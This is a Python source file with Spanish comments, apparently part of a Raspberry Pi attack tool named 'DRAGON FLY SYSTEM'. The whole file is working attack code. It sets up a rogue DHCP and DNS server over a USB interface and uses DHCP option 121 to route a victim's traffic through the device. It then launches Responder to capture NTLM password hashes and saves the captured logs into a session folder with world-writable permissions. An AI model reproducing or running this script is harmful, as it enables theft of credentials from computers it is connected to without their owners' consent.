import os
import subprocess
import time
import re
import select


def iniciar_ataque_red(interface="usb0", callback_consola=None, session_dir=None): # <-- Se añade session_dir
    
    def log(texto):
        texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
        reemplazos = ['¤', '[0m', '[1;32m', '[1;34m', '[0;33m']
        for simbolo in reemplazos:
            texto_limpio = texto_limpio.replace(simbolo, '')
            

        if callback_consola:
            # self.escribir_consola de raspi.py agrega los saltos de línea automáticamente
            callback_consola(f"{texto_limpio}") 
        else:
            print(texto_limpio)

    log(f"\n[!] DRAGON FLY SYSTEM")
    log(f"[*] Configurando interfaz: {interface}")
    
    os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
    os.system("sudo pkill -f responder > /dev/null 2>&1")
    os.system("sudo fuser -k 53/udp > /dev/null 2>&1")
    os.system("sudo fuser -k 67/udp > /dev/null 2>&1")
    
    dns_proc = None
    proc_responder = None
    
    try:
        log("[*] Desvinculando interfaz de NetworkManager...")
        os.system(f"sudo nmcli device set {interface} managed no > /dev/null 2>&1")
        
        log("[*] Levantando interfaz de red...")
        os.system(f"sudo ip link set {interface} up")
        
        time.sleep(3)
        
        os.system(f"sudo sysctl -w net.ipv6.conf.{interface}.disable_ipv6=1 > /dev/null 2>&1")
        
        log(f"[*] Asignando IP estática local a {interface}...")
        os.system(f"sudo ip addr flush dev {interface}")
        os.system(f"sudo ip addr add 1.0.0.1/8 dev {interface}")
        
        log("[*] Inyectando rutas estáticas...")
        os.system(f"sudo ip route add 1.0.0.0/8 dev {interface} 2>/dev/null")
        os.system(f"sudo ip route add 224.0.0.0/4 dev {interface} 2>/dev/null")
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
        
        config_dhcp = (
            f"interface={interface}\n"
            f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n"
            f"dhcp-option=3,1.0.0.1\n"
            f"dhcp-option=6,1.0.0.1\n"
            f"dhcp-option=121,0.0.0.0/0,1.0.0.1\n"
            f"bind-interfaces\n"
        )
        
        with open("dnsmasq_temp.conf", "w") as f:
            f.write(config_dhcp)
        
        log("[*] Lanzando servidor DHCP (dnsmasq)...")
        dns_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"], 
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        time.sleep(2) 
        
        log(f"\n[+] INTERFAZ LISTA: {interface}")
        log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")

        if os.path.exists("/usr/share/responder/Responder.py"):
            comando = ["sudo", "python3", "/usr/share/responder/Responder.py", "-I", interface, "-wvF"]
        elif os.path.exists("/opt/Responder/Responder.py"):
            comando = ["sudo", "python3", "/opt/Responder/Responder.py", "-I", interface, "-wvF"]
        else:
            comando = ["sudo", "responder", "-I", interface, "-wvF"]



        proc_responder = subprocess.Popen(
            comando,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )


        while True:
            # Usamos 'select' con timeout de 1 segundo para evitar que la lectura se congele
            reads, _, _ = select.select([proc_responder.stdout], [], [], 1.0)
            
            if proc_responder.stdout in reads:
                linea = proc_responder.stdout.readline()
                if not linea:  # Si ya no hay texto en el buffer
                    if proc_responder.poll() is not None:
                        break
                else:
                    log(linea.strip())
            else:
                # Timeout de 1 seg: Si no escupe nada nuevo, verificamos si presionaste "Detener"
                if proc_responder.poll() is not None:
                    break

    except Exception as e:
        log(f"\n[!] Error crítico: {e}")
    finally:
        log("\n[*] Deteniendo procesos y restaurando red...")
        
        if dns_proc:
            try: os.system(f"sudo kill {dns_proc.pid} > /dev/null 2>&1")
            except: pass
        
        if proc_responder:
            try: os.system(f"sudo kill {proc_responder.pid} > /dev/null 2>&1")
            except: pass
            
        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
        os.system(f"sudo ip addr flush dev {interface} > /dev/null 2>&1")
        
        if os.path.exists("dnsmasq_temp.conf"):
            try: os.remove("dnsmasq_temp.conf")
            except: pass
            
        # ==========================================
        # GUARDADO DE LOGS EN SESIÓN ESPECÍFICA
        # ==========================================
        if session_dir:
            log(f"[*] Organizando evidencia en: {os.path.basename(session_dir)}")
            os.makedirs(session_dir, exist_ok=True)
            
            # Usar 'sh -c' asegura que Root interprete el comodín (*) al mover los archivos
            os.system(f"sudo sh -c 'mv /usr/share/responder/logs/* {session_dir}/' 2>/dev/null")
            os.system(f"sudo sh -c 'mv /opt/Responder/logs/* {session_dir}/' 2>/dev/null")
            
            os.system(f"sudo chmod -R 777 {session_dir} 2>/dev/null")
            
        log("[+] Sistema restaurado. ¡Cacería finalizada!")
